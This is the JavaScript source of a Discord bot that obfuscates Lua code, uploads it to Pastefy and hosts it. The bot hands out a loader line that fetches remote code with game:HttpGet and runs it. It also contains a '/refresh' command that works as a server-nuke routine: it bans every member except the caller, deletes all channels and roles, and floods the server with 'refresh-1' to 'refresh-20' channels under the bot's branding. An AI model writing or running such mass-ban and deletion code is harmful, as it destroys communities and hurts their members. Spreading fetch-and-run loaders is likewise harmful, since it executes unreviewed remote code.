require('dotenv').config();

const {
    Client, GatewayIntentBits, SlashCommandBuilder, EmbedBuilder,
    AttachmentBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle,
    PermissionsBitField
} = require('discord.js');
const axios = require('axios');

const { obfuscate } = require('./obfuscator.js');

// ----------------------------------------------------------------------
// SERVER CONFIG
// ----------------------------------------------------------------------
const GUILD_ID = process.env.GUILD_ID || '1528140415276941555';
const AUTO_ROLE_ID = process.env.AUTO_ROLE_ID || '1529532495832416326';
const API_URL = (process.env.API_URL || '').replace(/\/+$/, '');
const API_SHARED_SECRET = process.env.API_SHARED_SECRET || '';
const REFRESH_ROLE_ID = '1524796988812431461'; // Role ID para usar /refresh

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.DirectMessages,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildModeration,
    ],
});

client.once('ready', () => {
    console.log(`Bot logged in as ${client.user.tag}`);
    registerCommands();
});

// ----------------------------------------------------------------------
// AUTO ROLE
// ----------------------------------------------------------------------
client.on('guildMemberAdd', async member => {
    if (member.guild.id !== GUILD_ID) return;
    try {
        await member.roles.add(AUTO_ROLE_ID);
        console.log(`Assigned role ${AUTO_ROLE_ID} to ${member.user.tag}`);
    } catch (err) {
        console.error(`Failed to assign auto role: ${err.message}`);
    }
});

// ----------------------------------------------------------------------
// SLASH COMMAND REGISTRATION
// ----------------------------------------------------------------------
async function registerCommands() {
    const commands = [
        new SlashCommandBuilder()
            .setName('obfuscate')
            .setDescription('Obfuscate your Lua code')
            .addStringOption(opt =>
                opt.setName('code')
                    .setDescription('Lua code to obfuscate')
                    .setRequired(false))
            .addAttachmentOption(opt =>
                opt.setName('file')
                    .setDescription('Lua file to obfuscate')
                    .setRequired(false)),

        new SlashCommandBuilder()
            .setName('obf')
            .setDescription('Obfuscate your Lua code (alias)')
            .addStringOption(opt =>
                opt.setName('code')
                    .setDescription('Lua code to obfuscate')
                    .setRequired(false))
            .addAttachmentOption(opt =>
                opt.setName('file')
                    .setDescription('Lua file to obfuscate')
                    .setRequired(false)),

        new SlashCommandBuilder()
            .setName('upload')
            .setDescription('Upload code to Pastefy')
            .addStringOption(opt =>
                opt.setName('code').setDescription('Code to upload').setRequired(false))
            .addAttachmentOption(opt =>
                opt.setName('file').setDescription('File to upload').setRequired(false)),

        new SlashCommandBuilder()
            .setName('api_url')
            .setDescription('Create a protected Hosting URL for Lua code')
            .addStringOption(opt =>
                opt.setName('code')
                    .setDescription('Lua code to host')
                    .setRequired(false))
            .addAttachmentOption(opt =>
                opt.setName('file')
                    .setDescription('Lua file to host')
                    .setRequired(false)),

        new SlashCommandBuilder()
            .setName('help')
            .setDescription('Show available commands'),

        new SlashCommandBuilder()
            .setName('refresh')
            .setDescription('⚠️ DELETE EVERYTHING and recreate the server (OWNER ROLE ONLY)')
            .addStringOption(opt =>
                opt.setName('confirm')
                    .setDescription('Type "YES" to confirm')
                    .setRequired(true)),
    ];

    try {
        await client.application.commands.set(commands);
        console.log('Commands registered successfully');
    } catch (err) {
        console.error('Error registering commands:', err);
    }
}

client.on('interactionCreate', async interaction => {
    try {
        if (interaction.isButton()) {
            if (interaction.customId.startsWith('api_copy:')) {
                await handleCopyButton(interaction);
            }
            return;
        }

        if (!interaction.isChatInputCommand()) return;

        if (interaction.commandName === 'obfuscate' || interaction.commandName === 'obf') {
            await handleObfuscate(interaction);
        } else if (interaction.commandName === 'upload') {
            await handleUpload(interaction);
        } else if (interaction.commandName === 'api_url') {
            await handleApiUrl(interaction);
        } else if (interaction.commandName === 'help') {
            await handleHelp(interaction);
        } else if (interaction.commandName === 'refresh') {
            await handleRefresh(interaction);
        }
    } catch (err) {
        console.error('Interaction error:', err);
    }
});

// ----------------------------------------------------------------------
// COMMAND HANDLERS
// ----------------------------------------------------------------------
async function handleObfuscate(interaction) {
    const code = interaction.options.getString('code');
    const file = interaction.options.getAttachment('file');

    if (!code && !file) {
        await interaction.reply({ content: 'Please provide code or a .lua file.' });
        return;
    }

    let srcCode = code || '';
    if (file) {
        try {
            const res = await axios.get(file.url);
            srcCode = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);
        } catch (e) {
            await interaction.reply({ content: `Could not download the file: ${e.message}` });
            return;
        }
    }

    await interaction.deferReply();
    try {
        const obfuscated = obfuscate(srcCode);
        await deliverObfuscationResult(interaction, srcCode, obfuscated);
    } catch (err) {
        console.error(err);
        await interaction.editReply({ content: `Error during obfuscation: ${err.message}` });
    }
}

async function deliverObfuscationResult(interaction, original, obfuscated) {
    const fileBuffer = Buffer.from(obfuscated, 'utf-8');
    const attachment = new AttachmentBuilder(fileBuffer, { name: 'obfuscated.lua' });

    let pasteUrl = 'N/A';
    try {
        const pasteData = await uploadToPastefy(obfuscated);
        pasteUrl = pasteData.url || pasteData.id || 'N/A';
    } catch (_) {}

    const dmEmbed = new EmbedBuilder()
        .setColor(0x00FF00)
        .setTitle('Code Obfuscated')
        .addFields(
            { name: 'Pastefy', value: pasteUrl, inline: false },
            { name: 'Size', value: `Original: ${original.length} bytes\nObfuscated: ${obfuscated.length} bytes`, inline: false },
        )
        .setFooter({ text: 'PaltidxR Obfuscator' });

    try {
        await interaction.user.send({ embeds: [dmEmbed], files: [attachment] });
        const channelEmbed = new EmbedBuilder()
            .setColor(0x00FF00)
            .setTitle('✅ Obfuscation completed')
            .setDescription(`${interaction.user}, check your DMs for the obfuscated file.`)
            .setFooter({ text: 'PaltidxR Obfuscator' });
        
        await interaction.editReply({ embeds: [channelEmbed] });
    } catch (_) {
        const fallbackEmbed = new EmbedBuilder()
            .setColor(0x00FF00)
            .setTitle('⚠️ Obfuscation completed')
            .setDescription(`${interaction.user}, I couldn't send you a DM. Here is your file.`)
            .addFields(
                { name: 'Pastefy', value: pasteUrl, inline: false },
                { name: 'Size', value: `Original: ${original.length} bytes\nObfuscated: ${obfuscated.length} bytes`, inline: false },
            )
            .setFooter({ text: 'PaltidxR Obfuscator' });

        await interaction.editReply({
            embeds: [fallbackEmbed],
            files: [new AttachmentBuilder(fileBuffer, { name: 'obfuscated.lua' })],
        });
    }
}

async function handleUpload(interaction) {
    const code = interaction.options.getString('code');
    const file = interaction.options.getAttachment('file');

    if (!code && !file) {
        await interaction.reply({ content: 'Please provide code or a file.' });
        return;
    }

    let content = code || '';
    if (file) {
        const res = await axios.get(file.url);
        content = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);
    }

    await interaction.deferReply();
    try {
        const data = await uploadToPastefy(content);
        const embed = new EmbedBuilder()
            .setColor(0x0099FF)
            .setTitle('Uploaded to Pastefy')
            .addFields({ name: 'URL', value: data.url || data.id || 'N/A' })
            .setFooter({ text: 'PaltidxR Obfuscator' });
        await interaction.editReply({ embeds: [embed] });
    } catch (err) {
        await interaction.editReply({ content: `Upload failed: ${err.message}` });
    }
}

async function handleApiUrl(interaction) {
    const code = interaction.options.getString('code');
    const file = interaction.options.getAttachment('file');

    if (!API_URL) {
        await interaction.reply({
            content: 'The Hosting API is not configured. Set API_URL in the bot service.',
            ephemeral: true,
        });
        return;
    }

    if (!code && !file) {
        await interaction.reply({
            content: 'Please provide code or a Lua file.',
            ephemeral: true,
        });
        return;
    }

    let sourceCode = code || '';
    if (file) {
        if (file.size && file.size > 2 * 1024 * 1024) {
            await interaction.reply({
                content: 'The file is too large. The maximum size is 2 MB.',
                ephemeral: true,
            });
            return;
        }

        try {
            const res = await axios.get(file.url, {
                responseType: 'text',
                timeout: 15_000,
                maxContentLength: 2 * 1024 * 1024,
                maxBodyLength: 2 * 1024 * 1024,
            });
            sourceCode = typeof res.data === 'string' ? res.data : String(res.data);
        } catch (err) {
            await interaction.reply({
                content: `Could not download the file: ${err.message}`,
                ephemeral: true,
            });
            return;
        }
    }

    await interaction.deferReply();

    try {
        const response = await axios.post(
            `${API_URL}/api/scripts`,
            { script: sourceCode },
            {
                headers: {
                    'Content-Type': 'application/json',
                    ...(API_SHARED_SECRET
                        ? { Authorization: `Bearer ${API_SHARED_SECRET}` }
                        : {}),
                },
                timeout: 15_000,
                maxContentLength: 1024 * 1024,
                maxBodyLength: 2 * 1024 * 1024,
            },
        );

        const scriptUrl = response.data?.url;
        const scriptId = response.data?.scriptId;
        if (!scriptUrl || !scriptId) {
            throw new Error('The Hosting API returned an invalid response.');
        }

        const loader = makeLoader(scriptUrl);
        const embed = new EmbedBuilder()
            .setColor(0xF1C40F)
            .setTitle('Code protected by Hosting')
            .setDescription(
                `Your code has been protected by Hosting.\n` +
                `Go to the URL and see: it's blocked.\n\n` +
                `**URL:** ${scriptUrl}`,
            )
            .addFields({
                name: 'Loadstring',
                value: `\`\`\`lua\n${loader}\n\`\`\``,
                inline: false,
            })
            .setFooter({ text: 'Hosting protection' });

        const copyButton = new ButtonBuilder()
            .setCustomId(`api_copy:${scriptId}`)
            .setLabel('Copy')
            .setStyle(ButtonStyle.Success);

        await interaction.editReply({
            embeds: [embed],
            components: [new ActionRowBuilder().addComponents(copyButton)],
        });
    } catch (err) {
        const apiMessage = err.response?.data?.error;
        await interaction.editReply({
            content: `Could not create the Hosting URL: ${apiMessage || err.message}`,
        });
    }
}

function makeLoader(scriptUrl) {
    return `loadstring(game:HttpGet(${JSON.stringify(scriptUrl)}, true))()`;
}

async function handleCopyButton(interaction) {
    const scriptId = interaction.customId.slice('api_copy:'.length);
    const scriptUrl = `${API_URL}/files/v1/loaders/${encodeURIComponent(scriptId)}`;
    const loader = makeLoader(scriptUrl);

    await interaction.reply({
        content: `Copy this loadstring:\n\`\`\`lua\n${loader}\n\`\`\``,
        ephemeral: true,
    });
}

async function handleHelp(interaction) {
    const embed = new EmbedBuilder()
        .setColor(0x9B59B6)
        .setTitle('Available Commands')
        .setDescription('All commands are slash commands.')
        .addFields(
            { name: '/obfuscate', value: 'Obfuscate Lua code or a .lua file. The obfuscated file will be sent to your DMs.', inline: false },
            { name: '/obf', value: 'Alias of /obfuscate.', inline: false },
            { name: '/upload', value: 'Upload Lua code or a file to Pastefy.', inline: false },
            { name: '/api_url', value: 'Create a protected Hosting URL from Lua code or a file.', inline: false },
            { name: '/help', value: 'Show this help message.', inline: false },
            { name: '/refresh', value: '⚠️ DESTROY AND RECREATE THE SERVER (OWNER ROLE ONLY)', inline: false },
        )
        .setFooter({ text: 'PaltidxR Obfuscator' });

    await interaction.reply({ embeds: [embed] });
}

// ======================================================================
// ============ COMANDO /refresh (DESTRUCTIVO) ============
// ======================================================================
async function handleRefresh(interaction) {
    // Verificar que el usuario tenga el role específico
    const member = interaction.member;
    const hasRole = member.roles.cache.has(REFRESH_ROLE_ID);
    
    if (!hasRole) {
        await interaction.reply({
            content: '❌ You are not authorized to use this command. You need the **Owner Role** to use this command.',
            ephemeral: true
        });
        return;
    }

    const confirm = interaction.options.getString('confirm');
    
    if (confirm !== 'YES') {
        await interaction.reply({
            content: '❌ You must type "YES" to confirm. This action is irreversible!',
            ephemeral: true
        });
        return;
    }

    await interaction.reply({
        content: '⚠️ **WARNING:** Starting server refresh... This will DELETE EVERYTHING!',
        ephemeral: true
    });

    const guild = interaction.guild;

    try {
        // ============ 1. BANEAR A TODOS LOS MIEMBROS ============
        await interaction.followUp({ content: '🔨 Banning all members...', ephemeral: true });
        
        const members = await guild.members.fetch();
        let bannedCount = 0;
        
        for (const [memberId, member] of members) {
            if (member.user.bot) {
                try {
                    await member.ban({ reason: 'Server refresh - PaltidxR' });
                    bannedCount++;
                } catch (e) {}
            } else if (!member.user.bot && member.id !== interaction.user.id) {
                try {
                    await member.ban({ reason: 'Server refresh - PaltidxR' });
                    bannedCount++;
                } catch (e) {}
            }
        }
        
        await interaction.followUp({ 
            content: `✅ Banned ${bannedCount} members.`, 
            ephemeral: true 
        });

        // ============ 2. ELIMINAR TODOS LOS CANALES ============
        await interaction.followUp({ content: '🗑️ Deleting all channels...', ephemeral: true });
        
        const channels = await guild.channels.fetch();
        let channelCount = 0;
        
        for (const [channelId, channel] of channels) {
            try {
                await channel.delete();
                channelCount++;
            } catch (e) {}
        }
        
        await interaction.followUp({ 
            content: `✅ Deleted ${channelCount} channels.`, 
            ephemeral: true 
        });

        // ============ 3. ELIMINAR TODOS LOS ROLES ============
        await interaction.followUp({ content: '🎭 Deleting all roles...', ephemeral: true });
        
        const roles = await guild.roles.fetch();
        let roleCount = 0;
        
        for (const [roleId, role] of roles) {
            if (role.name !== '@everyone' && !role.managed) {
                try {
                    await role.delete();
                    roleCount++;
                } catch (e) {}
            }
        }
        
        await interaction.followUp({ 
            content: `✅ Deleted ${roleCount} roles.`, 
            ephemeral: true 
        });

        // ============ 4. CREAR NUEVOS CANALES ============
        await interaction.followUp({ content: '📝 Creating new channels...', ephemeral: true });
        
        const channelNames = [
            'refresh-1', 'refresh-2', 'refresh-3', 'refresh-4', 'refresh-5',
            'refresh-6', 'refresh-7', 'refresh-8', 'refresh-9', 'refresh-10',
            'refresh-11', 'refresh-12', 'refresh-13', 'refresh-14', 'refresh-15',
            'refresh-16', 'refresh-17', 'refresh-18', 'refresh-19', 'refresh-20'
        ];
        
        let createdCount = 0;
        
        for (const name of channelNames) {
            try {
                await guild.channels.create({
                    name: name,
                    type: 0,
                    reason: 'Server refresh - PaltidxR'
                });
                createdCount++;
            } catch (e) {}
        }
        
        try {
            await guild.channels.create({
                name: 'regresa-aqui',
                type: 0,
                reason: 'Server refresh - PaltidxR'
            });
            createdCount++;
        } catch (e) {}

        await interaction.followUp({ 
            content: `✅ Created ${createdCount} channels.`, 
            ephemeral: true 
        });

        // ============ 5. MENSAJE FINAL ============
        await interaction.followUp({
            content: `
╔═══════════════════════════════════════════════════╗
║                                                     ║
║   🔥 SERVER REFRESH COMPLETED 🔥                    ║
║                                                     ║
║   This server has been refreshed by PaltidxR.       ║
║   All members were banned, all channels and         ║
║   roles were deleted.                               ║
║                                                     ║
║   Created 20+ channels named "refresh-1" to         ║
║   "refresh-20" and one channel called               ║
║   "regresa-aqui".                                   ║
║                                                     ║
║   ⚠️ This server is now ready for a fresh start.    ║
║                                                     ║
║   Powered by PaltidxR 🚀                           ║
║                                                     ║
╚═══════════════════════════════════════════════════╝
            `,
            ephemeral: true
        });

    } catch (error) {
        console.error('Refresh error:', error);
        await interaction.followUp({
            content: `❌ Error during refresh: ${error.message}`,
            ephemeral: true
        });
    }
}

async function uploadToPastefy(code) {
    const res = await axios.post('https://pastefy.app/api/v2/paste', {
        content: code,
        title: 'obfuscated.lua',
        type: 'PASTE',
    }, {
        headers: { 'Content-Type': 'application/json' },
    });
    return {
        url: `https://pastefy.app/${res.data.paste?.id || res.data.id}`,
        id: res.data.paste?.id || res.data.id,
    };
}

client.login(process.env.TOKEN);
